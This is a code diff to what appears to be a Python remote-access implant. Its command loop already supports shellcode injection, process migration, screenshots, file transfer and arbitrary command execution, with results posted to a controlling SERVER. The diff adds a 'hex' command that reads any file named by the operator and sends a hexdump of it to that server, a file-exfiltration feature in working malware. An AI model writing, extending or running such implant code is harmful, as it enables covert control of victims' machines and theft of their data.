@@ -43,6 +43,7 @@ special_commands = ["upload", "download", "setshellcode"]
 chg_dir    = re.compile(r'^\s*cd (.*)$')
 unix_path  = re.compile(r'^(.+/)*([^/]+)$')
 wind_path  = re.compile(r'^(.+\\)*([^/]+)$')
+hexdmp     = re.compile(r'^\s*hex\s+(.*)\s*$')
 screenshot = re.compile(r'^\s*screenshot\s*$')
 migrate    = re.compile(r'^\s*migrate\s+(\d+)\s*$')
 inject     = re.compile(r'^\s*inject\s+shellcode\s*$')
@@ -206,6 +207,18 @@ def inject_shellcode_windows(s):
     except Exception as error:
         s.post(SERVER, data=error)
 
+def hexdump(src, length=16):
+    """
+    Taken from: https://gist.github.com/7h3rAm/5603718
+    """
+    FILTER, lines = ''.join([(len(repr(chr(x))) == 3) and chr(x) or '.' for x in range(256)]), []
+    for c in range(0, len(src), length):
+        chars = src[c:c+length]
+        hex = ' '.join(["%02x" % ord(x) for x in chars]) if type(chars) is str else ' '.join(['{:02x}'.format(x) for x in chars])
+        if len(hex) > 24: hex = "%s %s" % (hex[:24], hex[24:])
+        printable = ''.join(["%s" % ((ord(x) <= 127 and FILTER[ord(x)]) or '.') for x in chars]) if type(chars) is str else ''.join(['{}'.format((x <= 127 and FILTER[x]) or '.') for x in chars])
+        lines.append("%08x:  %-*s  |%s|" % (c, length*3, hex, printable))
+    return '\n'.join(lines)
 
 username, error = exec_cmd("whoami")
 if os.name=='nt':
@@ -356,6 +369,16 @@ try:
                             s.post(SERVER,
                                 data='For now "migrate" command is available only for x86 & x64 windows systems.'
                             )
+                    elif hexdmp.match(cmd):
+                        file2hex = hexdmp.search(cmd).group(1)
+                        if valid_file(file2hex):
+                            with open(file2hex, 'rb') as f: data = f.read()
+                            hex_content = hexdump(data)
+                            s.post(SERVER,
+                                data=hex_content
+                            )
+                        else:
+                            s.post(SERVER, data="File doesn't exist or is not readable.")
                     else:
                         try:
                             stdout, stderr = exec_cmd(cmd)
